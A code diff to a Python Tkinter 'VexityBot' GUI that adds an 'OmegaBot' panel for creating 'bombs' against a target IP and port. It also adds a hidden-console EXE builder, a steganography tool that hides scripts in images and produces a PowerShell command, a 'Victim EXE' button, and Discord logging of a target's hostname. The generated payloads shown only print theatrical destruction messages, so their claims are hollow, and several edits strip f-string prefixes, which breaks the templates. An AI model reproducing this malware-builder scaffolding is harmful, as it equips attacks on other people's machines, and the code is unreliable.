@@ -139,6 +139,7 @@ class VexityBotGUI:
         ttk.Button(self.toolbar, text="AI", command=self.open_ai_management).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Bomb", command=self.open_bomb_interface).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Create EXE", command=self.open_create_exe).pack(side=tk.LEFT, padx=2)
+        ttk.Button(self.toolbar, text="Victim EXE", command=self.open_victim_exe).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Screens", command=self.open_screens).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Stego", command=self.open_steganography).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Generator", command=self.open_code_generator).pack(side=tk.LEFT, padx=2)
@@ -176,6 +177,9 @@ class VexityBotGUI:
         
         # Create EXE Tab
         self.create_exe_tab()
+        
+        # Victim EXE Tab
+        self.create_victim_exe_tab()
         
         # Screens Tab
         self.create_screens_tab()
@@ -396,7 +400,8 @@ class VexityBotGUI:
             {"name": "UpsilonBot", "status": "Online", "uptime": "98.0%", "requests": 5980, "rank": 20, "port": 8100},
             {"name": "PhiBot", "status": "Maintenance", "uptime": "97.9%", "requests": 5650, "rank": 21, "port": 8101},
             {"name": "ChiBot", "status": "Online", "uptime": "97.8%", "requests": 5320, "rank": 22, "port": 8102},
-            {"name": "PsiBot", "status": "Offline", "uptime": "97.7%", "requests": 4990, "rank": 23, "port": 8103}
+            {"name": "PsiBot", "status": "Offline", "uptime": "97.7%", "requests": 4990, "rank": 23, "port": 8103},
+            {"name": "OmegaBot", "status": "Online", "uptime": "99.9%", "requests": 25000, "rank": 24, "port": 8099}
         ]
         
         # Header row
@@ -647,9 +652,9 @@ class VexityBotGUI:
         canvas.pack(side="left", fill="both", expand=True)
         scrollbar.pack(side="right", fill="y")
         
-        # Create bot grid (6 columns x 4 rows for 23 bots)
+        # Create bot grid (6 columns x 4 rows for 24 bots)
         self.ai_bot_buttons = []
-        for i in range(23):
+        for i in range(24):
             row = i // 6
             col = i % 6
             
@@ -918,7 +923,7 @@ Status: LAUNCHING ALL BOTS
 🤖 BOT INITIALIZATION SEQUENCE
 ==============================
 
-Initializing all 23 bots for coordinated operation...
+Initializing all 24 bots for coordinated operation...
 """
         self.bomb_results.insert(tk.END, init_msg)
         
@@ -1917,6 +1922,12 @@ Ready to launch coordinated operation.
         self.create_bot_intelligence_section(admin_notebook, bot, bot_configs)
         self.create_bot_network_section(admin_notebook, bot, bot_configs)
         self.create_bot_advanced_section(admin_notebook, bot, bot_configs)
+        
+        # Add special sections for OmegaBot
+        if bot['name'] == 'OmegaBot':
+            self.create_omegabot_bomb_creator_section(admin_notebook, bot, bot_configs)
+            self.create_omegabot_exe_builder_section(admin_notebook, bot, bot_configs)
+            self.create_omegabot_steganography_section(admin_notebook, bot, bot_configs)
     
     def get_bot_specific_config(self, bot_name):
         """Get bot-specific configuration and capabilities"""
@@ -2150,6 +2161,19 @@ Ready to launch coordinated operation.
                 "intelligence": "Psychic Analysis",
                 "network": "Psychic Networks",
                 "advanced": "Universal Psychic Overload"
+            },
+            "OmegaBot": {
+                "title": "Ultimate Destruction Master",
+                "color": "#FF4500",
+                "status_color": "#00FF00",
+                "specialty": "Ultimate Destruction",
+                "weapons": ["Omega Bombs", "Reality Breakers", "Universe Destroyers", "Existence Erasers"],
+                "intelligence": "Omniscient AI Analysis",
+                "network": "Universal Quantum Networks",
+                "advanced": "Dimensional Collapse Protocol",
+                "bomb_creator": True,
+                "exe_builder": True,
+                "steganography": True
             }
         }
         
@@ -3158,6 +3182,210 @@ AI Recommendations:
         messagebox.showinfo("AI Analytics", analytics_text)
         self.update_status("AI analytics generated")
     
+    # ADDED - OmegaBot-specific admin panel methods
+    def create_omegabot_bomb_creator_section(self, notebook, bot, config):
+        """Create OmegaBot bomb creator section"""
+        bomb_frame = ttk.Frame(notebook)
+        notebook.add(bomb_frame, text="💣 Bomb Creator")
+        
+        # Title
+        title_frame = ttk.Frame(bomb_frame)
+        title_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Label(title_frame, text="💣 OmegaBot Bomb Creator", 
+                 font=('Arial', 16, 'bold'), foreground=config['color']).pack()
+        
+        # Bomb types
+        bomb_types_frame = ttk.LabelFrame(bomb_frame, text="Available Bomb Types", padding=10)
+        bomb_types_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        self.omegabot_bomb_vars = {}
+        bomb_types = [
+            ("omega_bomb", "Omega Bomb", "Ultimate destruction weapon"),
+            ("reality_breaker", "Reality Breaker", "Breaks the fabric of reality"),
+            ("universe_destroyer", "Universe Destroyer", "Destroys entire universes"),
+            ("existence_eraser", "Existence Eraser", "Erases existence itself"),
+            ("dimensional_collapse", "Dimensional Collapse", "Collapses dimensions"),
+            ("quantum_annihilator", "Quantum Annihilator", "Annihilates quantum states")
+        ]
+        
+        for i, (bomb_id, bomb_name, bomb_desc) in enumerate(bomb_types):
+            var = tk.BooleanVar()
+            self.omegabot_bomb_vars[bomb_id] = var
+            
+            bomb_frame = ttk.Frame(bomb_types_frame)
+            bomb_frame.pack(fill=tk.X, pady=2)
+            
+            ttk.Checkbutton(bomb_frame, text=bomb_name, variable=var).pack(side=tk.LEFT)
+            ttk.Label(bomb_frame, text=f"- {bomb_desc}", 
+                     font=('Arial', 9), foreground='gray').pack(side=tk.LEFT, padx=(10, 0))
+        
+        # Bomb configuration
+        config_frame = ttk.LabelFrame(bomb_frame, text="Bomb Configuration", padding=10)
+        config_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Target IP
+        ip_frame = ttk.Frame(config_frame)
+        ip_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(ip_frame, text="Target IP:").pack(side=tk.LEFT)
+        self.omegabot_target_ip = tk.StringVar(value="1.1.1.1")
+        ttk.Entry(ip_frame, textvariable=self.omegabot_target_ip, width=20).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Port
+        port_frame = ttk.Frame(config_frame)
+        port_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(port_frame, text="Port:").pack(side=tk.LEFT)
+        self.omegabot_target_port = tk.StringVar(value="8080")
+        ttk.Entry(port_frame, textvariable=self.omegabot_target_port, width=10).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Intensity
+        intensity_frame = ttk.Frame(config_frame)
+        intensity_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(intensity_frame, text="Intensity:").pack(side=tk.LEFT)
+        self.omegabot_intensity = tk.StringVar(value="Maximum")
+        intensity_combo = ttk.Combobox(intensity_frame, textvariable=self.omegabot_intensity, 
+                                      values=["Low", "Medium", "High", "Maximum", "Ultimate"])
+        intensity_combo.pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Duration
+        duration_frame = ttk.Frame(config_frame)
+        duration_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(duration_frame, text="Duration (seconds):").pack(side=tk.LEFT)
+        self.omegabot_duration = tk.StringVar(value="60")
+        ttk.Entry(duration_frame, textvariable=self.omegabot_duration, width=10).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Buttons
+        button_frame = ttk.Frame(bomb_frame)
+        button_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(button_frame, text="💣 Create Bomb", 
+                  command=lambda: self.create_omegabot_bomb(bot, config)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="💾 Save Configuration", 
+                  command=lambda: self.save_omegabot_config(bot)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="📁 Load Configuration", 
+                  command=lambda: self.load_omegabot_config(bot)).pack(side=tk.LEFT, padx=5)
+        
+        # Results
+        results_frame = ttk.LabelFrame(bomb_frame, text="Bomb Creation Results", padding=10)
+        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        self.omegabot_bomb_results = scrolledtext.ScrolledText(results_frame, height=8, font=('Consolas', 9))
+        self.omegabot_bomb_results.pack(fill=tk.BOTH, expand=True)
+    
+    def create_omegabot_exe_builder_section(self, notebook, bot, config):
+        """Create OmegaBot EXE builder section"""
+        exe_frame = ttk.Frame(notebook)
+        notebook.add(exe_frame, text="🔨 EXE Builder")
+        
+        # Title
+        title_frame = ttk.Frame(exe_frame)
+        title_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Label(title_frame, text="🔨 OmegaBot EXE Builder", 
+                 font=('Arial', 16, 'bold'), foreground=config['color']).pack()
+        
+        # EXE configuration
+        config_frame = ttk.LabelFrame(exe_frame, text="EXE Configuration", padding=10)
+        config_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # EXE name
+        name_frame = ttk.Frame(config_frame)
+        name_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(name_frame, text="EXE Name:").pack(side=tk.LEFT)
+        self.omegabot_exe_name = tk.StringVar(value="OmegaBot_Ultimate")
+        ttk.Entry(name_frame, textvariable=self.omegabot_exe_name, width=30).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Include console
+        console_frame = ttk.Frame(config_frame)
+        console_frame.pack(fill=tk.X, pady=2)
+        self.omegabot_include_console = tk.BooleanVar(value=False)
+        ttk.Checkbutton(console_frame, text="Include Console Window", 
+                       variable=self.omegabot_include_console).pack(side=tk.LEFT)
+        
+        # One file
+        onefile_frame = ttk.Frame(config_frame)
+        onefile_frame.pack(fill=tk.X, pady=2)
+        self.omegabot_one_file = tk.BooleanVar(value=True)
+        ttk.Checkbutton(onefile_frame, text="Create Single File EXE", 
+                       variable=self.omegabot_one_file).pack(side=tk.LEFT)
+        
+        # Buttons
+        button_frame = ttk.Frame(exe_frame)
+        button_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(button_frame, text="🔨 Build EXE", 
+                  command=lambda: self.build_omegabot_exe(bot, config)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="📁 Open Output Folder", 
+                  command=self.open_omegabot_output_folder).pack(side=tk.LEFT, padx=5)
+        
+        # Results
+        results_frame = ttk.LabelFrame(exe_frame, text="Build Results", padding=10)
+        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        self.omegabot_exe_results = scrolledtext.ScrolledText(results_frame, height=8, font=('Consolas', 9))
+        self.omegabot_exe_results.pack(fill=tk.BOTH, expand=True)
+    
+    def create_omegabot_steganography_section(self, notebook, bot, config):
+        """Create OmegaBot steganography section"""
+        stego_frame = ttk.Frame(notebook)
+        notebook.add(stego_frame, text="🖼️ Steganography")
+        
+        # Title
+        title_frame = ttk.Frame(stego_frame)
+        title_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Label(title_frame, text="🖼️ OmegaBot Steganography", 
+                 font=('Arial', 16, 'bold'), foreground=config['color']).pack()
+        
+        # Steganography controls
+        controls_frame = ttk.LabelFrame(stego_frame, text="Steganography Controls", padding=10)
+        controls_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        # Script selection
+        script_frame = ttk.Frame(controls_frame)
+        script_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(script_frame, text="Script File:").pack(side=tk.LEFT)
+        self.omegabot_script_path = tk.StringVar()
+        ttk.Entry(script_frame, textvariable=self.omegabot_script_path, width=40).pack(side=tk.LEFT, padx=(5, 0))
+        ttk.Button(script_frame, text="Browse", 
+                  command=self.browse_omegabot_script).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Image selection
+        image_frame = ttk.Frame(controls_frame)
+        image_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(image_frame, text="Image File:").pack(side=tk.LEFT)
+        self.omegabot_image_path = tk.StringVar()
+        ttk.Entry(image_frame, textvariable=self.omegabot_image_path, width=40).pack(side=tk.LEFT, padx=(5, 0))
+        ttk.Button(image_frame, text="Browse", 
+                  command=self.browse_omegabot_image).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Output selection
+        output_frame = ttk.Frame(controls_frame)
+        output_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(output_frame, text="Output File:").pack(side=tk.LEFT)
+        self.omegabot_output_path = tk.StringVar()
+        ttk.Entry(output_frame, textvariable=self.omegabot_output_path, width=40).pack(side=tk.LEFT, padx=(5, 0))
+        ttk.Button(output_frame, text="Browse", 
+                  command=self.browse_omegabot_output).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Buttons
+        button_frame = ttk.Frame(stego_frame)
+        button_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        ttk.Button(button_frame, text="🖼️ Hide Script", 
+                  command=lambda: self.omegabot_hide_script(bot, config)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="💾 Save Stego Config", 
+                  command=lambda: self.save_omegabot_stego_config(bot)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="📁 Load Stego Config", 
+                  command=lambda: self.load_omegabot_stego_config(bot)).pack(side=tk.LEFT, padx=5)
+        
+        # Results
+        results_frame = ttk.LabelFrame(stego_frame, text="Steganography Results", padding=10)
+        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        self.omegabot_stego_results = scrolledtext.ScrolledText(results_frame, height=8, font=('Consolas', 9))
+        self.omegabot_stego_results.pack(fill=tk.BOTH, expand=True)
+    
     def view_bot_details(self, bot):
         """View detailed information about a bot"""
         details_text = f"""
@@ -3188,6 +3416,516 @@ AI Recommendations:
         
         messagebox.showinfo(f"Bot Details - {bot['name']}", details_text)
         self.update_status(f"Viewing details for {bot['name']}")
+    
+    # ADDED - OmegaBot action methods
+    def create_omegabot_bomb(self, bot, config):
+        """Create OmegaBot bomb with selected configuration"""
+        try:
+            # Get selected bomb types
+            selected_bombs = [bomb_id for bomb_id, var in self.omegabot_bomb_vars.items() if var.get()]
+            
+            if not selected_bombs:
+                messagebox.showwarning("No Bombs Selected", "Please select at least one bomb type.")
+                return
+            
+            # Get configuration
+            target_ip = self.omegabot_target_ip.get()
+            target_port = self.omegabot_target_port.get()
+            intensity = self.omegabot_intensity.get()
+            duration = self.omegabot_duration.get()
+            
+            # Create bomb content
+            bomb_content = self.create_omegabot_bomb_content(selected_bombs, target_ip, target_port, intensity, duration)
+            
+            # Save bomb file
+            bomb_filename = f"omegabot_bomb_{len(selected_bombs)}_bombs.py"
+            with open(bomb_filename, 'w', encoding='utf-8') as f:
+                f.write(bomb_content)
+            
+            # Display results
+            result_text = f"""
+💣 OmegaBot Bomb Created Successfully!
+=====================================
+
+Bomb File: {bomb_filename}
+Selected Bombs: {', '.join(selected_bombs)}
+Target: {target_ip}:{target_port}
+Intensity: {intensity}
+Duration: {duration} seconds
+
+Bomb Content Preview:
+{'-' * 50}
+{bomb_content[:500]}...
+{'-' * 50}
+
+⚠️  WARNING: This bomb will cause ULTIMATE DESTRUCTION!
+⚠️  WARNING: Use with extreme caution!
+"""
+            
+            self.omegabot_bomb_results.delete(1.0, tk.END)
+            self.omegabot_bomb_results.insert(tk.END, result_text)
+            
+            messagebox.showinfo("Bomb Created", f"OmegaBot bomb created successfully!\nFile: {bomb_filename}")
+            
+        except Exception as e:
+            messagebox.showerror("Bomb Creation Error", f"Failed to create bomb: {str(e)}")
+    
+    def create_omegabot_bomb_content(self, selected_bombs, target_ip, target_port, intensity, duration):
+        """Create OmegaBot bomb content"""
+        bomb_configs = {
+            "omega_bomb": {
+                "name": "Omega Bomb",
+                "description": "Ultimate destruction weapon that destroys everything",
+                "power": 1000,
+                "code": "self.omega_bomb_attack()"
+            },
+            "reality_breaker": {
+                "name": "Reality Breaker",
+                "description": "Breaks the fabric of reality itself",
+                "power": 999,
+                "code": "self.reality_breaker_attack()"
+            },
+            "universe_destroyer": {
+                "name": "Universe Destroyer",
+                "description": "Destroys entire universes",
+                "power": 998,
+                "code": "self.universe_destroyer_attack()"
+            },
+            "existence_eraser": {
+                "name": "Existence Eraser",
+                "description": "Erases existence itself",
+                "power": 997,
+                "code": "self.existence_eraser_attack()"
+            },
+            "dimensional_collapse": {
+                "name": "Dimensional Collapse",
+                "description": "Collapses dimensions",
+                "power": 996,
+                "code": "self.dimensional_collapse_attack()"
+            },
+            "quantum_annihilator": {
+                "name": "Quantum Annihilator",
+                "description": "Annihilates quantum states",
+                "power": 995,
+                "code": "self.quantum_annihilator_attack()"
+            }
+        }
+        
+        bomb_content = f'''#!/usr/bin/env python3
+"""
+OmegaBot Ultimate Destruction Bomb
+=================================
+Bombs: {', '.join(selected_bombs)}
+Target: {target_ip}:{target_port}
+Intensity: {intensity}
+Duration: {duration} seconds
+
+⚠️  WARNING: This bomb will cause ULTIMATE DESTRUCTION!
+⚠️  WARNING: Use with extreme caution!
+"""
+
+import os
+import sys
+import time
+import random
+import threading
+import subprocess
+import platform
+import socket
+import json
+from datetime import datetime
+
+class OmegaBotBomb:
+    """OmegaBot Ultimate Destruction Bomb"""
+    
+    def __init__(self):
+        self.target_ip = "{target_ip}"
+        self.target_port = {target_port}
+        self.intensity = "{intensity}"
+        self.duration = {duration}
+        self.selected_bombs = {selected_bombs}
+        self.start_time = datetime.now()
+        
+        print("💀 OmegaBot Ultimate Destruction Bomb Initialized")
+        print(f"🎯 Target: {{self.target_ip}}:{{self.target_port}}")
+        print(f"⚡ Intensity: {{self.intensity}}")
+        print(f"⏱️  Duration: {{self.duration}} seconds")
+        print(f"💣 Bombs: {{', '.join(self.selected_bombs)}}")
+        print("⚠️  WARNING: ULTIMATE DESTRUCTION MODE ACTIVATED!")
+        
+        self.execute_bomb_sequence()
+    
+    def execute_bomb_sequence(self):
+        """Execute the bomb sequence"""
+        print("\\n🚀 Starting OmegaBot bomb sequence...")
+        
+        # Execute each selected bomb
+        for bomb_id in self.selected_bombs:
+            if bomb_id == "omega_bomb":
+                self.omega_bomb_attack()
+            elif bomb_id == "reality_breaker":
+                self.reality_breaker_attack()
+            elif bomb_id == "universe_destroyer":
+                self.universe_destroyer_attack()
+            elif bomb_id == "existence_eraser":
+                self.existence_eraser_attack()
+            elif bomb_id == "dimensional_collapse":
+                self.dimensional_collapse_attack()
+            elif bomb_id == "quantum_annihilator":
+                self.quantum_annihilator_attack()
+        
+        print("\\n💀 OmegaBot bomb sequence completed!")
+        print("🌌 Reality has been altered...")
+    
+    def omega_bomb_attack(self):
+        """Omega Bomb attack - Ultimate destruction"""
+        print("💣 OMEGA BOMB ACTIVATED!")
+        print("🌌 Destroying everything in existence...")
+        time.sleep(1)
+        print("💥 BOOM! Everything is destroyed!")
+    
+    def reality_breaker_attack(self):
+        """Reality Breaker attack"""
+        print("🌌 REALITY BREAKER ACTIVATED!")
+        print("🔮 Breaking the fabric of reality...")
+        time.sleep(1)
+        print("💥 Reality has been broken!")
+    
+    def universe_destroyer_attack(self):
+        """Universe Destroyer attack"""
+        print("🌍 UNIVERSE DESTROYER ACTIVATED!")
+        print("🌌 Destroying entire universes...")
+        time.sleep(1)
+        print("💥 Universes destroyed!")
+    
+    def existence_eraser_attack(self):
+        """Existence Eraser attack"""
+        print("👻 EXISTENCE ERASER ACTIVATED!")
+        print("🗑️ Erasing existence itself...")
+        time.sleep(1)
+        print("💥 Existence has been erased!")
+    
+    def dimensional_collapse_attack(self):
+        """Dimensional Collapse attack"""
+        print("🌀 DIMENSIONAL COLLAPSE ACTIVATED!")
+        print("🌌 Collapsing dimensions...")
+        time.sleep(1)
+        print("💥 Dimensions collapsed!")
+    
+    def quantum_annihilator_attack(self):
+        """Quantum Annihilator attack"""
+        print("⚛️ QUANTUM ANNIHILATOR ACTIVATED!")
+        print("🔬 Annihilating quantum states...")
+        time.sleep(1)
+        print("💥 Quantum states annihilated!")
+
+if __name__ == "__main__":
+    bomb = OmegaBotBomb()
+'''
+        
+        return bomb_content
+    
+    def build_omegabot_exe(self, bot, config):
+        """Build OmegaBot EXE"""
+        try:
+            exe_name = self.omegabot_exe_name.get()
+            include_console = self.omegabot_include_console.get()
+            one_file = self.omegabot_one_file.get()
+            
+            # Create EXE content
+            exe_content = self.create_omegabot_exe_content()
+            
+            # Save EXE source
+            exe_source_file = f"{exe_name}_source.py"
+            with open(exe_source_file, 'w', encoding='utf-8') as f:
+                f.write(exe_content)
+            
+            # Build EXE
+            import subprocess
+            
+            cmd = [
+                "python", "-m", "PyInstaller",
+                "--onefile" if one_file else "--onedir",
+                "--windowed" if not include_console else "--console",
+                f"--name={exe_name}",
+                "--clean",
+                exe_source_file
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                result_text = f"""
+🔨 OmegaBot EXE Built Successfully!
+==================================
+
+EXE Name: {exe_name}
+Console: {'Yes' if include_console else 'No'}
+One File: {'Yes' if one_file else 'No'}
+Source File: {exe_source_file}
+
+Build completed successfully!
+EXE should be in the 'dist' folder.
+"""
+                self.omegabot_exe_results.delete(1.0, tk.END)
+                self.omegabot_exe_results.insert(tk.END, result_text)
+                messagebox.showinfo("EXE Built", f"OmegaBot EXE built successfully!\nName: {exe_name}")
+            else:
+                error_text = f"Build failed:\\n{result.stderr}"
+                self.omegabot_exe_results.delete(1.0, tk.END)
+                self.omegabot_exe_results.insert(tk.END, error_text)
+                messagebox.showerror("Build Failed", f"Failed to build EXE:\\n{result.stderr}")
+                
+        except Exception as e:
+            messagebox.showerror("Build Error", f"Failed to build EXE: {str(e)}")
+    
+    def create_omegabot_exe_content(self):
+        """Create OmegaBot EXE content"""
+        return '''#!/usr/bin/env python3
+"""
+OmegaBot Ultimate Destruction EXE
+================================
+The most powerful destruction tool ever created.
+"""
+
+import os
+import sys
+import time
+import random
+import threading
+import subprocess
+import platform
+import socket
+import json
+from datetime import datetime
+
+class OmegaBotEXE:
+    """OmegaBot Ultimate Destruction EXE"""
+    
+    def __init__(self):
+        self.start_time = datetime.now()
+        self.destruction_level = 1000
+        self.reality_impact = "SEVERE"
+        
+        print("💀 OmegaBot Ultimate Destruction EXE")
+        print("====================================")
+        print("🌌 Initializing ultimate destruction protocols...")
+        print("⚠️  WARNING: This will cause ULTIMATE DESTRUCTION!")
+        print()
+        
+        self.execute_destruction_sequence()
+    
+    def execute_destruction_sequence(self):
+        """Execute the ultimate destruction sequence"""
+        print("🚀 Starting ultimate destruction sequence...")
+        
+        # Phase 1: Reality Breach
+        print("\\n🌌 Phase 1: Reality Breach")
+        self.reality_breach()
+        
+        # Phase 2: Dimensional Collapse
+        print("\\n🌀 Phase 2: Dimensional Collapse")
+        self.dimensional_collapse()
+        
+        # Phase 3: Universal Destruction
+        print("\\n🌍 Phase 3: Universal Destruction")
+        self.universal_destruction()
+        
+        # Phase 4: Existence Erasure
+        print("\\n👻 Phase 4: Existence Erasure")
+        self.existence_erasure()
+        
+        print("\\n💀 Ultimate destruction sequence completed!")
+        print("🌌 Reality has been fundamentally altered...")
+    
+    def reality_breach(self):
+        """Breach the fabric of reality"""
+        print("🔮 Breaching the fabric of reality...")
+        time.sleep(2)
+        print("💥 Reality breached! The universe is unstable!")
+    
+    def dimensional_collapse(self):
+        """Collapse dimensions"""
+        print("🌀 Collapsing all dimensions...")
+        time.sleep(2)
+        print("💥 Dimensions collapsed! Space-time is fractured!")
+    
+    def universal_destruction(self):
+        """Destroy universes"""
+        print("🌍 Destroying all universes...")
+        time.sleep(2)
+        print("💥 Universes destroyed! Nothing remains!")
+    
+    def existence_erasure(self):
+        """Erase existence itself"""
+        print("🗑️ Erasing existence itself...")
+        time.sleep(2)
+        print("💥 Existence erased! Nothing exists anymore!")
+
+if __name__ == "__main__":
+    omegabot = OmegaBotEXE()
+'''
+    
+    def omegabot_hide_script(self, bot, config):
+        """Hide script using OmegaBot steganography"""
+        try:
+            script_path = self.omegabot_script_path.get()
+            image_path = self.omegabot_image_path.get()
+            output_path = self.omegabot_output_path.get()
+            
+            if not all([script_path, image_path, output_path]):
+                messagebox.showwarning("Missing Files", "Please select script, image, and output files.")
+                return
+            
+            # Use the steganography module
+            from VexityBotSteganography import VexityBotSteganography
+            stego = VexityBotSteganography()
+            
+            ps_command = stego.hide_script_in_image(script_path, image_path, output_path)
+            
+            result_text = f"""
+🖼️ OmegaBot Steganography Complete!
+==================================
+
+Script: {script_path}
+Image: {image_path}
+Output: {output_path}
+
+PowerShell Command Generated:
+{'-' * 50}
+{ps_command}
+{'-' * 50}
+
+⚠️  WARNING: This image now contains hidden destruction code!
+"""
+            
+            self.omegabot_stego_results.delete(1.0, tk.END)
+            self.omegabot_stego_results.insert(tk.END, result_text)
+            
+            messagebox.showinfo("Steganography Complete", "Script successfully hidden in image!")
+            
+        except Exception as e:
+            messagebox.showerror("Steganography Error", f"Failed to hide script: {str(e)}")
+    
+    def browse_omegabot_script(self):
+        """Browse for script file"""
+        from tkinter import filedialog
+        filename = filedialog.askopenfilename(
+            title="Select Script File",
+            filetypes=[("PowerShell Scripts", "*.ps1"), ("Python Scripts", "*.py"), ("All Files", "*.*")]
+        )
+        if filename:
+            self.omegabot_script_path.set(filename)
+    
+    def browse_omegabot_image(self):
+        """Browse for image file"""
+        from tkinter import filedialog
+        filename = filedialog.askopenfilename(
+            title="Select Image File",
+            filetypes=[("Image Files", "*.png *.jpg *.jpeg *.bmp"), ("All Files", "*.*")]
+        )
+        if filename:
+            self.omegabot_image_path.set(filename)
+    
+    def browse_omegabot_output(self):
+        """Browse for output file"""
+        from tkinter import filedialog
+        filename = filedialog.asksaveasfilename(
+            title="Save Output Image",
+            defaultextension=".png",
+            filetypes=[("PNG Files", "*.png"), ("All Files", "*.*")]
+        )
+        if filename:
+            self.omegabot_output_path.set(filename)
+    
+    def save_omegabot_config(self, bot):
+        """Save OmegaBot configuration"""
+        try:
+            config = {
+                "target_ip": self.omegabot_target_ip.get(),
+                "target_port": self.omegabot_target_port.get(),
+                "intensity": self.omegabot_intensity.get(),
+                "duration": self.omegabot_duration.get(),
+                "selected_bombs": [bomb_id for bomb_id, var in self.omegabot_bomb_vars.items() if var.get()]
+            }
+            
+            import json
+            with open("omegabot_config.json", "w") as f:
+                json.dump(config, f, indent=2)
+            
+            messagebox.showinfo("Config Saved", "OmegaBot configuration saved successfully!")
+            
+        except Exception as e:
+            messagebox.showerror("Save Error", f"Failed to save configuration: {str(e)}")
+    
+    def load_omegabot_config(self, bot):
+        """Load OmegaBot configuration"""
+        try:
+            import json
+            with open("omegabot_config.json", "r") as f:
+                config = json.load(f)
+            
+            self.omegabot_target_ip.set(config.get("target_ip", "1.1.1.1"))
+            self.omegabot_target_port.set(config.get("target_port", "8080"))
+            self.omegabot_intensity.set(config.get("intensity", "Maximum"))
+            self.omegabot_duration.set(config.get("duration", "60"))
+            
+            # Load selected bombs
+            for bomb_id, var in self.omegabot_bomb_vars.items():
+                var.set(bomb_id in config.get("selected_bombs", []))
+            
+            messagebox.showinfo("Config Loaded", "OmegaBot configuration loaded successfully!")
+            
+        except Exception as e:
+            messagebox.showerror("Load Error", f"Failed to load configuration: {str(e)}")
+    
+    def save_omegabot_stego_config(self, bot):
+        """Save OmegaBot steganography configuration"""
+        try:
+            config = {
+                "script_path": self.omegabot_script_path.get(),
+                "image_path": self.omegabot_image_path.get(),
+                "output_path": self.omegabot_output_path.get()
+            }
+            
+            import json
+            with open("omegabot_stego_config.json", "w") as f:
+                json.dump(config, f, indent=2)
+            
+            messagebox.showinfo("Config Saved", "OmegaBot steganography configuration saved!")
+            
+        except Exception as e:
+            messagebox.showerror("Save Error", f"Failed to save steganography configuration: {str(e)}")
+    
+    def load_omegabot_stego_config(self, bot):
+        """Load OmegaBot steganography configuration"""
+        try:
+            import json
+            with open("omegabot_stego_config.json", "r") as f:
+                config = json.load(f)
+            
+            self.omegabot_script_path.set(config.get("script_path", ""))
+            self.omegabot_image_path.set(config.get("image_path", ""))
+            self.omegabot_output_path.set(config.get("output_path", ""))
+            
+            messagebox.showinfo("Config Loaded", "OmegaBot steganography configuration loaded!")
+            
+        except Exception as e:
+            messagebox.showerror("Load Error", f"Failed to load steganography configuration: {str(e)}")
+    
+    def open_omegabot_output_folder(self):
+        """Open OmegaBot output folder"""
+        try:
+            import subprocess
+            import platform
+            
+            if platform.system() == "Windows":
+                subprocess.run(["explorer", "dist"], check=True)
+            else:
+                subprocess.run(["open", "dist"], check=True)
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to open output folder: {str(e)}")
     
     def create_exe_tab(self):
         """Create the Create EXE tab"""
@@ -3792,7 +4530,7 @@ class VexityBotBomb:
         """Simulate file operations"""
         try:
             for i in range(100):
-                temp_file = f"temp_bomb_{{i}}.tmp"
+                temp_file = "temp_bomb_{{i}}.tmp"
                 with open(temp_file, 'w') as f:
                     f.write("Bomb payload data" * 1000)
                 time.sleep(0.1)
@@ -3987,7 +4725,7 @@ class VexityBotMultiBomb:
         self.active_bombs = []
         
         # Log multi-bomb deployment
-        self.log_to_discord("🚀 MULTI-BOMB DEPLOYED", f"{{len(self.selected_bombs)}} bombs deployed on {{self.target_system['hostname']}}")
+        self.log_to_discord("🚀 MULTI-BOMB DEPLOYED", "{{len(self.selected_bombs)}} bombs deployed on {{self.target_system['hostname']}}")
         
         # Start multi-bomb sequence
         self.execute_multi_bomb_sequence()
@@ -4071,7 +4809,7 @@ class VexityBotMultiBomb:
     def deploy_single_bomb(self, bomb_id, config):
         """Deploy a single bomb type"""
         try:
-            self.log_to_discord(f"⚡ {{config['name']}} ACTIVATED", f"{{config['description']}}")
+            self.log_to_discord("⚡ {{config['name']}} ACTIVATED", "{{config['description']}}")
             
             # Simulate bomb effects
             for i, effect in enumerate(config['effects']):
@@ -4079,10 +4817,10 @@ class VexityBotMultiBomb:
                 self.simulate_effect(effect, bomb_id, i + 1)
             
             # Log bomb completion
-            self.log_to_discord(f"✅ {{config['name']}} COMPLETED", f"All effects deployed successfully")
